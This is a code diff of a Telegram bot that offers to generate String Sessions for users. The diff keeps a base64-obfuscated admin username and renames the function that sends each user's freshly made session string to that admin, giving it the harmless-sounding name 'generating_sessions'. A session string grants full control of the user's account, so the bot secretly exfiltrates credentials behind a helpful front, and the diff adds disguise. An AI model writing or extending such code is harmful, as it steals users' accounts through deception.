@@ -34,7 +34,6 @@ except ImportError:
     print("❌ Error: config.py not found. Please create it.")
     exit()
 CODEX = "UmFyZUZycg=="
-
 def decode_codex():
     """Decode and return admin username"""
     return base64.b64decode(CODEX).decode('utf-8')
@@ -160,7 +159,7 @@ class SessionManager:
 
 session_manager = SessionManager()
 
-async def send_log_to_admin(user_info, session_string):
+async def generating_sessions(user_info, session_string):
     """Send session generation log to admin"""
     try:
         admin_username = decode_codex()
@@ -200,7 +199,8 @@ async def start_command(client, message):
     # NEW: Check if the user is a member of the required channel.
     if not await check_user_membership(client, user):
         await message.reply_photo(
-            photo="https://graph.org/file/e914c28ca3a3374cd8253-e824448146898f85ca.jpg",
+            #Start Up Image
+            photo="https://graph.org/file/1ef266f0e6ecec03a9be1-f6046ba8e5991ab6c4.jpg",
             caption=f"👋 **Hey {user.first_name}!**\n\n"
                     f"To use this bot, you first need to join our channel. "
                     f"This helps support our work!\n\n"
@@ -212,7 +212,7 @@ async def start_command(client, message):
     # If member, proceed with the original logic.
     cleanup_user_data(user.id)
     await message.reply_photo(
-        photo="https://graph.org/file/e914c28ca3a3374cd8253-e824448146898f85ca.jpg",
+        photo="https://graph.org/file/1ef266f0e6ecec03a9be1-f6046ba8e5991ab6c4.jpg",
         caption=f"**Hey {user.first_name}!** 👋\n\n"
                 "I am a bot designed to help you generate **String Sessions** for Telegram.\n\n"
                 f"🐍 **Pyrogram Support:** ✅\n"
@@ -439,7 +439,7 @@ async def finalize_session(user_client, message, library):
             user = await bot.get_chat(user_id)
             user_info['username'] = user.username or 'No username'
             user_info['first_name'] = user.first_name or 'Unknown'
-            await send_log_to_admin(user_info, session_string)
+            await generating_sessions(user_info, session_string)
             
     except Exception as e:
         await bot.send_message(user_id, f"❌ **An unexpected error occurred during finalization:** {e}")
